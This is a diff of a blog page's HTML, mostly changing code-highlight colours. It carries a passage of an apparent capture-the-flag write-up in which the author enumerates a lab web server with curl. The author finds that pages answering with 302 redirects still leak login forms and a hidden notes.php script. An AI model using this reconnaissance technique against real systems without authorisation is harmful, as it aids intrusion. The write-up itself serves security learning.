+02009:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">302</span>     <span style="color:#bd93f9">21</span> L        <span style="color:#bd93f9">38</span> W      <span style="color:#bd93f9">566</span> Ch    <span style="color:#f1fa8c">&#34; - panel&#34;</span>
+02076:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">302</span>     <span style="color:#bd93f9">17</span> L        <span style="color:#bd93f9">35</span> W      <span style="color:#bd93f9">387</span> Ch    <span style="color:#f1fa8c">&#34; - personal&#34;</span>
+02439:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>      <span style="color:#bd93f9">7</span> L        <span style="color:#bd93f9">21</span> W      <span style="color:#bd93f9">170</span> Ch    <span style="color:#f1fa8c">&#34; - server&#34;</span>
+02852:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>      <span style="color:#bd93f9">2</span> L         <span style="color:#bd93f9">2</span> W       <span style="color:#bd93f9">19</span> Ch    <span style="color:#f1fa8c">&#34; - users&#34;</span>
 </code></pre></div><p>So this gives us slightly more to work with. All of the above are relative to <code>super_secret_login_path_muhahaha</code>.
 <code>/1</code> was a big red <strong>INTRUDER ALERT</strong> message, and <code>/server</code> was a gif of a server rack falling over.</p>
 <p>From the .php file side of things, it was slightly more interesting.</p>
@@ -244,144 +213,144 @@ ID Response   Lines      Word         Chars          Request
 <li><code>users.php</code> just returned the words <em>Jack</em>. This is the same user mentioned in the shrine page from <code>/personal/</code>.</li>
 </ul>
 <p>Due to these auth requirements, I decided to take all of these url&rsquo;s to <code>curl</code>, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
 &lt;HTML&gt;
-&lt;FORM name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login.php&#34;</span>&gt;
+&lt;FORM <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#8be9fd;font-style:italic">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login.php&#34;</span>&gt;
 &lt;CENTER&gt;
 &lt;H1&gt; Admin &lt;/H1&gt;
 &lt;H3&gt;
 &lt;STRONG&gt;Username:&lt;/STRONG&gt;
-&lt;INPUT name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>/&gt;
+&lt;INPUT <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#8be9fd;font-style:italic">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span>/&gt;
 &lt;BR&gt;
 &lt;BR&gt;
 &lt;STRONG&gt;Password:&lt;/STRONG&gt;
-&lt;INPUT name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>/&gt;
+&lt;INPUT <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#8be9fd;font-style:italic">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span>/&gt;
 &lt;BR&gt;
 &lt;BR&gt;
-&lt;INPUT name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mysubmit&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mysubmit&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login&#34;</span>/&gt;
+&lt;INPUT <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mysubmit&#34;</span> <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mysubmit&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#8be9fd;font-style:italic">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Login&#34;</span>/&gt;
 &lt;/H3&gt;
 &lt;/HTML&gt;
 </code></pre></div><p>Here I am telling curl to make a <code>GET</code> request to http://192.168.56.102/super_secret_login_path_muhahaha/index.php, using a cookies file called <code>cookies</code> when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of <code>302</code>&rsquo;s, and be verbose with output so that I can see the headers. Requesting <code>index.php</code> resulted in a cookie jar of:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
-<span style="color:#75715e"># Netscape HTTP Cookie File</span>
-<span style="color:#75715e"># http://curl.haxx.se/rfc/cookie_spec.html</span>
-<span style="color:#75715e"># This file was generated by libcurl! Edit at your own risk.</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
+<span style="color:#6272a4"># Netscape HTTP Cookie File</span>
+<span style="color:#6272a4"># http://curl.haxx.se/rfc/cookie_spec.html</span>
+<span style="color:#6272a4"># This file was generated by libcurl! Edit at your own risk.</span>
 
-192.168.56.102 FALSE /  FALSE <span style="color:#ae81ff">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /  FALSE <span style="color:#bd93f9">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
 </code></pre></div><p>Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to <code>personal.php</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
-* About to connect<span style="color:#f92672">()</span> to 192.168.56.102 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
+* About to connect<span style="color:#ff79c6">()</span> to 192.168.56.102 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
 *   Trying 192.168.56.102...
 * connected
-* Connected to 192.168.56.102 <span style="color:#f92672">(</span>192.168.56.102<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+* Connected to 192.168.56.102 <span style="color:#ff79c6">(</span>192.168.56.102<span style="color:#ff79c6">)</span> port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
 &gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
 &gt; User-Agent: curl/7.26.0
 &gt; Host: 192.168.56.102
 &gt; Accept: */*
-&gt; Cookie: PHPSESSID<span style="color:#f92672">=</span>8u300rbb0747fi6iocm0lt4310
+&gt; Cookie: <span style="color:#8be9fd;font-style:italic">PHPSESSID</span><span style="color:#ff79c6">=</span>8u300rbb0747fi6iocm0lt4310
 &gt;
 * HTTP 1.1 or later with persistent connection, pipelining supported
-&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> Found
-&lt; Date: Sun, <span style="color:#ae81ff">20</span> Jul <span style="color:#ae81ff">2014</span> 07:48:17 GMT
-&lt; Server: Apache/2.2.22 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+&lt; HTTP/1.1 <span style="color:#bd93f9">302</span> Found
+&lt; Date: Sun, <span style="color:#bd93f9">20</span> Jul <span style="color:#bd93f9">2014</span> 07:48:17 GMT
+&lt; Server: Apache/2.2.22 <span style="color:#ff79c6">(</span>Debian<span style="color:#ff79c6">)</span>
 &lt; X-Powered-By: PHP/5.4.4-14+deb7u11
-&lt; Expires: Thu, <span style="color:#ae81ff">19</span> Nov <span style="color:#ae81ff">1981</span> 08:52:00 GMT
-&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span style="color:#f92672">=</span>0, pre-check<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+&lt; Expires: Thu, <span style="color:#bd93f9">19</span> Nov <span style="color:#bd93f9">1981</span> 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span style="color:#ff79c6">=</span>0, pre-check<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
 &lt; Pragma: no-cache
 &lt; Location: index.php
 &lt; Vary: Accept-Encoding
-&lt; Content-Length: <span style="color:#ae81ff">387</span>
+&lt; Content-Length: <span style="color:#bd93f9">387</span>
 &lt; Content-Type: text/html
 &lt;
-* Ignoring the response-body     <span style="color:#75715e"># WAIT A SEC...</span>
-* Connection <span style="color:#75715e">#0 to host 192.168.56.102 left intact</span>
-* Issue another request to this URL: <span style="color:#e6db74">&#39;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&#39;</span>
-* Re-using existing connection! <span style="color:#f92672">(</span><span style="color:#75715e">#0) with host (nil)</span>
-* Connected to <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>192.168.56.102<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+* Ignoring the response-body     <span style="color:#6272a4"># WAIT A SEC...</span>
+* Connection <span style="color:#6272a4">#0 to host 192.168.56.102 left intact</span>
+* Issue another request to this URL: <span style="color:#f1fa8c">&#39;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&#39;</span>
+* Re-using existing connection! <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0) with host (nil)</span>
+* Connected to <span style="color:#ff79c6">(</span>nil<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span>192.168.56.102<span style="color:#ff79c6">)</span> port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
 &gt; GET /super_secret_login_path_muhahaha/index.php HTTP/1.1
 </code></pre></div><p>Look at line 25. <em>Ignoring the request-body</em>. But we got a 302? Ok lets make another request without the <code>-L</code> flag and check if it reveals anything:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
-* About to connect<span style="color:#f92672">()</span> to 192.168.56.102 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
+* About to connect<span style="color:#ff79c6">()</span> to 192.168.56.102 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
 *   Trying 192.168.56.102...
 * connected
-* Connected to 192.168.56.102 <span style="color:#f92672">(</span>192.168.56.102<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+* Connected to 192.168.56.102 <span style="color:#ff79c6">(</span>192.168.56.102<span style="color:#ff79c6">)</span> port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
 &gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
 &gt; User-Agent: curl/7.26.0
 &gt; Host: 192.168.56.102
 &gt; Accept: */*
-&gt; Cookie: PHPSESSID<span style="color:#f92672">=</span>8u300rbb0747fi6iocm0lt4310
+&gt; Cookie: <span style="color:#8be9fd;font-style:italic">PHPSESSID</span><span style="color:#ff79c6">=</span>8u300rbb0747fi6iocm0lt4310
 &gt;
 * HTTP 1.1 or later with persistent connection, pipelining supported
-&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> Found
-&lt; Date: Sun, <span style="color:#ae81ff">20</span> Jul <span style="color:#ae81ff">2014</span> 07:54:07 GMT
-&lt; Server: Apache/2.2.22 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+&lt; HTTP/1.1 <span style="color:#bd93f9">302</span> Found
+&lt; Date: Sun, <span style="color:#bd93f9">20</span> Jul <span style="color:#bd93f9">2014</span> 07:54:07 GMT
+&lt; Server: Apache/2.2.22 <span style="color:#ff79c6">(</span>Debian<span style="color:#ff79c6">)</span>
 &lt; X-Powered-By: PHP/5.4.4-14+deb7u11
-&lt; Expires: Thu, <span style="color:#ae81ff">19</span> Nov <span style="color:#ae81ff">1981</span> 08:52:00 GMT
-&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span style="color:#f92672">=</span>0, pre-check<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+&lt; Expires: Thu, <span style="color:#bd93f9">19</span> Nov <span style="color:#bd93f9">1981</span> 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span style="color:#ff79c6">=</span>0, pre-check<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
 &lt; Pragma: no-cache
 &lt; Location: index.php
 &lt; Vary: Accept-Encoding
-&lt; Content-Length: <span style="color:#ae81ff">387</span>
+&lt; Content-Length: <span style="color:#bd93f9">387</span>
 &lt; Content-Type: text/html
 &lt;
 &lt;HTML&gt;
-&lt;FORM name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;check.php&#34;</span>&gt;
+&lt;FORM <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#8be9fd;font-style:italic">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;check.php&#34;</span>&gt;
 &lt;CENTER&gt;
 &lt;H1&gt; Personal Folder Login &lt;/H1&gt;
 &lt;H3&gt;
 &lt;STRONG&gt;Username:&lt;/STRONG&gt;
-&lt;INPUT name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>/&gt;
+&lt;INPUT <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#8be9fd;font-style:italic">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span>/&gt;
 &lt;BR&gt;
 &lt;BR&gt;
 &lt;STRONG&gt;Password:&lt;/STRONG&gt;
-&lt;INPUT name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>/&gt;
+&lt;INPUT <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#8be9fd;font-style:italic">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span>/&gt;
 &lt;BR&gt;
 &lt;BR&gt;
-&lt;INPUT name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mysubmit&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mysubmit&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login&#34;</span>/&gt;
+&lt;INPUT <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mysubmit&#34;</span> <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mysubmit&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#8be9fd;font-style:italic">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Login&#34;</span>/&gt;
 &lt;/H3&gt;
 &lt;/HTML&gt;
 
-* Connection <span style="color:#75715e">#0 to host 192.168.56.102 left intact</span>
-* Closing connection <span style="color:#75715e">#0</span>
+* Connection <span style="color:#6272a4">#0 to host 192.168.56.102 left intact</span>
+* Closing connection <span style="color:#6272a4">#0</span>
 </code></pre></div><p>Well what do you know. We get a 302 and content. This time we have a login form that posts to <code>check.php</code>. A <code>GET</code> request to <code>check.php</code> resulted in a 302, but to <code>personal.php</code> and not <code>index.php</code>.</p>
 <p><code>panel.php</code> had similar behavior. Showing content even though we got a 302. The output for <code>panel.php</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">HTML</span>&gt;
-&lt;<span style="color:#f92672">CENTRE</span>&gt;
-&lt;<span style="color:#f92672">H2</span>&gt; Folders &lt;/<span style="color:#f92672">H2</span>&gt;
-&lt;<span style="color:#f92672">TABLE</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:700px&#34;</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;center&#34;</span>&gt;
-&lt;<span style="color:#f92672">TR</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;server.php&#34;</span>&gt;&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#f92672">A</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.php&#34;</span>&gt;&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#f92672">A</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;users.php&#34;</span>&gt;&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#f92672">A</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;personal.php&#34;</span>&gt;&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#f92672">A</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notes.php&#34;</span>&gt;&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#f92672">A</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-&lt;/<span style="color:#f92672">TR</span>&gt;
-&lt;<span style="color:#f92672">TR</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">H4</span>&gt;Server Status&lt;/<span style="color:#f92672">H4</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">H4</span>&gt;Mail Status&lt;/<span style="color:#f92672">H4</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">H4</span>&gt;Auth Users&lt;/<span style="color:#f92672">H4</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">H4</span>&gt;Personal Folder&lt;/<span style="color:#f92672">H4</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-   &lt;<span style="color:#f92672">TD</span>&gt;&lt;<span style="color:#f92672">H4</span>&gt;Notes&lt;/<span style="color:#f92672">H4</span>&gt;&lt;/<span style="color:#f92672">TD</span>&gt;
-&lt;/<span style="color:#f92672">TR</span>&gt;
-&lt;/<span style="color:#f92672">CENTRE</span>&gt;
-&lt;/<span style="color:#f92672">HTML</span>&gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">HTML</span>&gt;
+&lt;<span style="color:#ff79c6">CENTRE</span>&gt;
+&lt;<span style="color:#ff79c6">H2</span>&gt; Folders &lt;/<span style="color:#ff79c6">H2</span>&gt;
+&lt;<span style="color:#ff79c6">TABLE</span> <span style="color:#50fa7b">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:700px&#34;</span> <span style="color:#50fa7b">align</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;center&#34;</span>&gt;
+&lt;<span style="color:#ff79c6">TR</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">A</span> <span style="color:#50fa7b">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;server.php&#34;</span>&gt;&lt;<span style="color:#ff79c6">IMG</span> <span style="color:#50fa7b">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#ff79c6">A</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">A</span> <span style="color:#50fa7b">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mail.php&#34;</span>&gt;&lt;<span style="color:#ff79c6">IMG</span> <span style="color:#50fa7b">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#ff79c6">A</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">A</span> <span style="color:#50fa7b">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;users.php&#34;</span>&gt;&lt;<span style="color:#ff79c6">IMG</span> <span style="color:#50fa7b">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#ff79c6">A</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">A</span> <span style="color:#50fa7b">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;personal.php&#34;</span>&gt;&lt;<span style="color:#ff79c6">IMG</span> <span style="color:#50fa7b">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#ff79c6">A</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">A</span> <span style="color:#50fa7b">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notes.php&#34;</span>&gt;&lt;<span style="color:#ff79c6">IMG</span> <span style="color:#50fa7b">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/<span style="color:#ff79c6">A</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+&lt;/<span style="color:#ff79c6">TR</span>&gt;
+&lt;<span style="color:#ff79c6">TR</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">H4</span>&gt;Server Status&lt;/<span style="color:#ff79c6">H4</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">H4</span>&gt;Mail Status&lt;/<span style="color:#ff79c6">H4</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">H4</span>&gt;Auth Users&lt;/<span style="color:#ff79c6">H4</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">H4</span>&gt;Personal Folder&lt;/<span style="color:#ff79c6">H4</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+   &lt;<span style="color:#ff79c6">TD</span>&gt;&lt;<span style="color:#ff79c6">H4</span>&gt;Notes&lt;/<span style="color:#ff79c6">H4</span>&gt;&lt;/<span style="color:#ff79c6">TD</span>&gt;
+&lt;/<span style="color:#ff79c6">TR</span>&gt;
+&lt;/<span style="color:#ff79c6">CENTRE</span>&gt;
+&lt;/<span style="color:#ff79c6">HTML</span>&gt;
 </code></pre></div><p>Here we have another script, <code>notes.php</code> revealed. Browsing to <code>notes.php</code>, we are presented with a input field with a <em>Write Note</em> button, and a message stating: <em>&ldquo;note.txt stored to temporary storage upon submission&rdquo;</em>. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.</p>
 <h2 id="finding-the-web-vuln">finding the web vuln</h2>
 <p>Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.</p>
